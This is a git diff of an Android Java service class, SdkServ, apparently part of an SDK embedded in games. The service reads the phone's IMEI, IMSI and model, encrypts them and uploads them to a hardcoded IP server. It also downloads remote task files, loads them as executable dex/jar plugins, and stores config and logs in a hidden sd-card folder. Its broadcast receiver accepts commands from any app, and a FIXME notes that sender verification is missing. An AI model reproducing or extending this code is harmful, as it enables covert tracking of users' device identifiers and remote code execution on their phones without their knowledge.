@@ -29,7 +29,6 @@ import org.apache.http.client.methods.HttpGet;
 import org.apache.http.impl.client.DefaultHttpClient;
 import org.apache.http.message.BasicHeader;
 
-import dalvik.system.DexClassLoader;
 import android.app.Service;
 import android.content.BroadcastReceiver;
 import android.content.Context;
@@ -37,8 +36,6 @@ import android.content.Intent;
 import android.content.IntentFilter;
 import android.os.Environment;
 import android.os.Handler;
-import android.os.IBinder;
-import android.os.Looper;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 import android.widget.Toast;
@@ -52,11 +49,11 @@ public class SdkServ implements DServ{
 
 	
 	
-	public SdkServ(DService context) {
-		ctx = context;
+	public SdkServ() {
 	}
 	
-	private static DService ctx;
+	
+	DService ctx;
 	
 	private static final String TAG = "DServ";
 	
@@ -78,9 +75,6 @@ public class SdkServ implements DServ{
     public static final String ERR_KEY_EXPIRED = "e03";
     public static final String ERR_DECRYPT_CLIENT = "e04";
     
-//	private static byte[] key = new byte[]{79, 13, 33, -66, -58, 103, 3, -34, -45, 53, 9, 45, 28, -124, 50, -2};
-//	private static final byte[] ROOTKEY = new byte[]{79, 13, 33, -66, -58, 103, 3, -34, -45, 53, 9, 45, 28, -124, 50, -2};
-	
 	private static int taskSleepTime = 10*1000;
 	private static int upSleepTime = 1000*10*2;
 	private static int shortSleepTime = 1000*10*2;
@@ -99,10 +93,12 @@ public class SdkServ implements DServ{
 	static final String RECEIVER_ACTION = "com.k99k.dservice";
 	private static int uid = 0;
 	
-	private UpThread upThread;
-	private TaskThread taskThread;
+	UpThread upThread;
+	TaskThread taskThread;
 	
-	private  String cacheDir= "/data/data/cn.play.dserv";
+//	private  String cacheDir= ctx.getApplicationInfo().dataDir;
+	
+	
 	//TODO 暂时写死
 	private static String upUrl = "http://180.96.63.71:8080/plserver/PS";
 	private static String upLogUrl = "http://192.168.0.16:8080/PLServer/PL";
@@ -115,7 +111,7 @@ public class SdkServ implements DServ{
 	private HashMap<String,Object> config;
 	private String configPath = sdDir+"cache_01";
 	
-	private String pkgName = this.ctx.getPackageName();
+//	private String pkgName = ctx.getPackageName();
 
 
 		
@@ -129,21 +125,24 @@ public class SdkServ implements DServ{
 		this.config.put("emvPath", sdDir+"emv.jar");
 		this.config.put("t", "");
 		this.saveConfig();
+		
 	}
 	
 	@SuppressWarnings("unchecked")
 	private HashMap<String,Object> readConfig(String configPath){
-		String txt = readTxt(configPath);
-		Log.d(TAG, "read enc:"+txt);
-		if (!StringUtil.isStringWithLen(txt, 44)) {
-			Log.e(TAG, "config File error!");
-			return this.config;
-		}
+//		String txt = readTxt(configPath);
+//		Log.d(TAG, "read enc:"+txt);
+//		if (!StringUtil.isStringWithLen(txt, 44)) {
+//			Log.e(TAG, "config File error!");
+//			return this.config;
+//		}
 		try {
-			String jsonStr = DService._readConfig(txt);
-			HashMap<String, Object> m = (HashMap<String, Object>) JSON.read(jsonStr);
-			if (m != null && m.size()>2) {
-				this.config = m;
+			String jsonStr = DService.CreadConfig(configPath);
+			if (jsonStr != null) {
+				HashMap<String, Object> m = (HashMap<String, Object>) JSON.read(jsonStr);
+				if (m != null && m.size()>2) {
+					this.config = m;
+				}
 			}
 		} catch (Exception e) {
 			Log.e(TAG, "config File error!",e);
@@ -181,8 +180,9 @@ public class SdkServ implements DServ{
 			String cTime = String.valueOf(System.currentTimeMillis());
 			this.config.put("timeStamp", cTime);
 			String conf = JSON.write(this.config);
-			String enc =  DService._enc(conf);
-			writeTxt(configPath,enc);
+			DService.CsaveConfig(configPath, conf);
+//			String enc =  DService.CsaveConfig(configPath, conf);
+//			writeTxt(configPath,enc);
 		} catch (Exception e) {
 			Log.e(TAG, "save config error!", e);
 		}
@@ -190,31 +190,34 @@ public class SdkServ implements DServ{
 	
 	//----------------------------config end------------------------------------
 	
-	private BroadcastReceiver myReceiver = new BroadcastReceiver() {
-	 
+	public class Receiv extends BroadcastReceiver{
+
 		@Override
 		public void onReceive(Context context, Intent intent) {
 			int act = intent.getExtras().getInt("act");
 			Log.w(TAG, "receive act:"+act);
 			if (act == 0) {
 				Intent i = new Intent();  
-				i.setClass(context, ctx.getClass());  
+				i.setClass(context, SdkServ.this.ctx.getClass());  
 				context.startService(i);
 				return;
 			}
-			String authKey = intent.getExtras().getString("a");
-			String gameId = intent.getExtras().getString("g");
-			String channelId = intent.getExtras().getString("c");
+			
+			//String authKey = intent.getExtras().getString("a");
+			
+			String pkgId = intent.getExtras().getString("p");
+			String paras = intent.getExtras().getString("v");
 			String msg = intent.getExtras().getString("m");
-			if (gameId == null) {
-				gameId = "";
+			if (pkgId == null) {
+				return;
 			}
-			if (channelId == null) {
-				channelId = "";
+			if (paras == null) {
+				paras = "";
 			}
 			if (msg == null) {
 				msg = "";
 			}
+			
 			//FIXME 验证发送源的合法性,imei号验证,这个用c实现
 			
 			
@@ -225,30 +228,96 @@ public class SdkServ implements DServ{
 				it.putExtra("emvPath", SdkServ.this.emvPath);
 				it.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
 				context.startActivity(it); 
-				log(LEVEL_I, "MORE_"+act, gameId, channelId, msg);
+				log(LEVEL_I, "MORE_"+act, paras, "", msg);
 				break;
 			case ACT_GAME_INIT:
 			case ACT_GAME_EXIT:
 			case ACT_GAME_CUSTOM:
-				log(LEVEL_I, "GAME_"+act, gameId, channelId, msg);
+				log(LEVEL_I, "GAME_"+act, paras, "", msg);
 				break;
 			case ACT_FEE_INIT:
 			case ACT_FEE_OK:
 			case ACT_FEE_FAIL:
-				log(LEVEL_I, "FEE_"+act, gameId, channelId, msg);
+				log(LEVEL_I, "FEE_"+act, paras, "", msg);
 				break;
 			case ACT_PUSH_CLICK:
 			case ACT_PUSH_RECEIVE:
-				log(LEVEL_I, "PUSH_"+act, gameId, channelId, msg);
+				log(LEVEL_I, "PUSH_"+act, paras, "", msg);
 				break;
 
 			default:
 				Intent i = new Intent();  
-				i.setClass(context, ctx.getClass());  
+				i.setClass(context, SdkServ.this.ctx.getClass());  
 				context.startService(i);
 			}
 		}
-	};
+		
+	}
+	
+	BroadcastReceiver myReceiver = new Receiv();
+	
+//	public BroadcastReceiver myReceiver = new BroadcastReceiver() {
+//	 
+//		@Override
+//		public void onReceive(Context context, Intent intent) {
+//			int act = intent.getExtras().getInt("act");
+//			Log.w(TAG, "receive act:"+act);
+//			if (act == 0) {
+//				Intent i = new Intent();  
+//				i.setClass(context, ctx.getClass());  
+//				context.startService(i);
+//				return;
+//			}
+//			
+//			//String authKey = intent.getExtras().getString("a");
+//			
+//			String pkgId = intent.getExtras().getString("p");
+//			String paras = intent.getExtras().getString("v");
+//			String msg = intent.getExtras().getString("m");
+//			if (pkgId == null) {
+//				return;
+//			}
+//			if (paras == null) {
+//				paras = "";
+//			}
+//			if (msg == null) {
+//				msg = "";
+//			}
+//			
+//			//FIXME 验证发送源的合法性,imei号验证,这个用c实现
+//			
+//			
+//			switch (act) {
+//			case ACT_EMACTIVITY_START:
+//				Intent it= new Intent(context.getApplicationContext(), cn.play.dserv.EmptyActivity.class);    
+//				it.putExtra("emvClass", SdkServ.this.emvClass);
+//				it.putExtra("emvPath", SdkServ.this.emvPath);
+//				it.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
+//				context.startActivity(it); 
+//				log(LEVEL_I, "MORE_"+act, paras, "", msg);
+//				break;
+//			case ACT_GAME_INIT:
+//			case ACT_GAME_EXIT:
+//			case ACT_GAME_CUSTOM:
+//				log(LEVEL_I, "GAME_"+act, paras, "", msg);
+//				break;
+//			case ACT_FEE_INIT:
+//			case ACT_FEE_OK:
+//			case ACT_FEE_FAIL:
+//				log(LEVEL_I, "FEE_"+act, paras, "", msg);
+//				break;
+//			case ACT_PUSH_CLICK:
+//			case ACT_PUSH_RECEIVE:
+//				log(LEVEL_I, "PUSH_"+act, paras, "", msg);
+//				break;
+//
+//			default:
+//				Intent i = new Intent();  
+//				i.setClass(context, ctx.getClass());  
+//				context.startService(i);
+//			}
+//		}
+//	};
 	
 	void setNextUpTime(long nextUptime){
 		nextUpTime = nextUptime;
@@ -289,7 +358,7 @@ public class SdkServ implements DServ{
 	}
 	
 	
-	public static boolean downloadGoOn(String url, String filePath,String filename) {
+	public static boolean downloadGoOn(String url, String filePath,String filename,Context ct) {
 		// file.size()即可得到原来下载文件的大小
 //		// 设置代理
 //		Header header = null;
@@ -307,13 +376,13 @@ public class SdkServ implements DServ{
 		HttpResponse response = null;
 		// 用来获取下载文件的大小
 		HttpResponse response_test = null;
-		long downloadfilesize = 0;
+		//long downloadfilesize = 0;
 		try {
 			HttpClient client = new DefaultHttpClient();
 			HttpClient client_test = new DefaultHttpClient();
 			HttpGet request = new HttpGet(url);
 			HttpGet request_test = new HttpGet(url);
-			request.addHeader("v", DService._makeC(ctx));
+			request.addHeader("v", DService.CmakeC(ct));
 //			if (header != null) {
 //				request.addHeader(header);
 //			}
@@ -358,7 +427,9 @@ public class SdkServ implements DServ{
 				fos.write(buf, 0, numread);
 //				if (handler != null) {
 ////					Message msg = new Message();
-					downloadfilesize += numread;
+				
+				//	downloadfilesize += numread;
+				
 //					double percent = (double) (downloadfilesize + size)
 //							/ fileSize;
 ////					msg.obj = String.valueOf(percent);
@@ -655,11 +726,11 @@ public class SdkServ implements DServ{
 
 	private boolean fetchRemoteTask(int id,String downUrl){
 		String remote = downUrl+"?id="+id;
-		return downloadGoOn(remote,sdDir,id+datFileType);
+		return downloadGoOn(remote,sdDir,id+datFileType,this.ctx);
 	}
 	
 	
-	class UpThread extends Thread{
+	public class UpThread extends Thread{
 
 		private boolean runFlag = true;
 		
@@ -670,11 +741,15 @@ public class SdkServ implements DServ{
 			this.runFlag = runFlag;
 		}
 
-		private boolean up(){
+		public boolean up(){
 			try {
 				StringBuilder sb = new StringBuilder();
 				int api_level = android.os.Build.VERSION.SDK_INT;
-				TelephonyManager tm=(TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
+				if (SdkServ.this.ctx == null) {
+					Log.e("UP", "ctx is null");
+					return false;
+				}
+				TelephonyManager tm=(TelephonyManager) SdkServ.this.ctx.getSystemService(Context.TELEPHONY_SERVICE);
 				String imei = tm.getDeviceId();
 				String imsi = tm.getSubscriberId();
 				String ua = android.os.Build.MODEL;
@@ -696,11 +771,11 @@ public class SdkServ implements DServ{
 				
 				Log.d(TAG, "postUrl data:"+sb.toString());
 				
-				String data = "up="+DService._enc(sb.toString());
+				String data = "up="+DService.Cenc(sb.toString());
 				URL aUrl = new URL(upUrl);
 			    URLConnection conn = aUrl.openConnection();
 			    conn.setConnectTimeout(timeOut);
-			    conn.setRequestProperty("v", DService._makeC(ctx));
+			    conn.setRequestProperty("v", DService.CmakeC(SdkServ.this.ctx));
 			    conn.setDoInput(true);
 			    conn.setDoOutput(true);
 			    OutputStreamWriter wr = new OutputStreamWriter(conn.getOutputStream());
@@ -728,12 +803,12 @@ public class SdkServ implements DServ{
 			    		
 					}else{
 						//
-						Toast.makeText(ctx, resp, Toast.LENGTH_SHORT).show();;
+						Toast.makeText(SdkServ.this.ctx.getApplicationContext(), resp, Toast.LENGTH_SHORT).show();;
 					}
 			    	return false;
 				}
 			    //解密
-				String re = resp;Encrypter.getInstance().decrypt(resp);
+				String re = DService.Cresp(resp);//Encrypter.getInstance().decrypt(resp);
 				Log.d(TAG, "dec re:"+re);
 				String[] res = re.split(SPLIT_STR);
 				if (!StringUtil.isDigits(res[0])) {
@@ -900,13 +975,14 @@ public class SdkServ implements DServ{
 		}
 	}
 	
-	class TaskThread extends Thread{
+	public class TaskThread extends Thread{
 	
 		private boolean runFlag = true;
 		
 		
 		@Override
 		public void run() {
+			Log.i(TAG, "TaskThread started");
 			if (SdkServ.this.state != STATE_RUNNING) {
 				return;
 			}
@@ -990,20 +1066,20 @@ public class SdkServ implements DServ{
 		File f = new File(dexPath);
 		if (f.exists() && f.isFile()) {
 			try{
-				//TODO 这里需要解密处理,暂不实现加解密,直接下载的就是原始dex文件
-				dexPath = localPath+id+".jar";
-				f.renameTo(new File(dexPath));
+				//重命名
+				String dexPath2 = localPath+id+".jar";
+//				f.renameTo(new File(dexPath2));
 				/*
 				DexClassLoader cDexClassLoader = new DexClassLoader(dexPath, cacheDir,null, this.getClass().getClassLoader()); 
 				Class<?> class1 = cDexClassLoader.loadClass("cn.play.dserv.PLTask1");	
 				PLTask plug =(PLTask)class1.newInstance();
 */
-				PLTask plug = DService._loadTask(dexPath,ctx);
-				
-
-				//TODO 这里需要重新加密,移除解密后的文件
-				dexPath = localPath+id+datFileType;
-				f.renameTo(new File(dexPath));
+				PLTask plug = DService.CloadTask(this.ctx,dexPath,dexPath2);
+				//删除临时jar
+				f = new File(dexPath2);
+				if (f.exists() && f.isFile()) {
+					f.delete();
+				}
 				return plug;
 			}catch (Exception e) {
 				Log.e(TAG, "loadTask error:"+localPath);
@@ -1032,9 +1108,15 @@ public class SdkServ implements DServ{
 		}
 	}
 	
-	public void init(){
+	public void init(DService dservice){
 		Log.d(TAG, "init...");
-		DService._init(ctx);
+		ctx = dservice;
+		if (ctx == null) {
+			Log.e("CTX", "IS NULL");
+			return ;
+		}else{
+			Log.d("CTX", ctx.getPackageName());
+		}
 		lt.start();
 		this.config = this.readConfig(this.configPath);
 		if (this.config == null || this.config.size() <= 0) {
@@ -1062,7 +1144,7 @@ public class SdkServ implements DServ{
 		}else if(this.state == STATE_PAUSE){
 			return;
 		}
-		cacheDir = ctx.getApplicationInfo().dataDir;
+//		cacheDir = ctx.getApplicationInfo().dataDir;
 		emvClass = this.getPropString("emvClass", "cn.play.dserv.CheckTool");
 		emvPath = this.getPropString("emvPath", Environment.getExternalStorageDirectory().getPath()+"/.dserver/emv.jar");
 		(new File(sdDir)).mkdirs();
@@ -1084,7 +1166,6 @@ public class SdkServ implements DServ{
 				}
 			}
 		}
-		
 		if (this.upThread != null || this.taskThread!=null) {
 			this.upThread.setRun(false);
 			this.taskThread.setRun(false);
@@ -1277,7 +1358,7 @@ public class SdkServ implements DServ{
 		String s = sb.toString();
 		if (s.length() > 0) {
 			sb = new StringBuilder();
-			String str = DService._enc(s)+NEWlINE;
+			String str = DService.Cenc(s)+NEWlINE;
 			writeTxt(logFile, str,true);
 			Log.d("DLOG", s);
 		}
@@ -1286,7 +1367,7 @@ public class SdkServ implements DServ{
 	static String readLog(){
 		return readTxt(logFile);
 	}
-	class LT extends Thread{
+	public class LT extends Thread{
 
 		/* (non-Javadoc)
 		 * @see java.lang.Thread#run()
@@ -1294,7 +1375,7 @@ public class SdkServ implements DServ{
 		@Override
 		public void run() {
 			while (true) {
-				if (sb.length() >= 0) {
+				if (sb.length() >= 2048) {
 					save();
 				}
 				try {
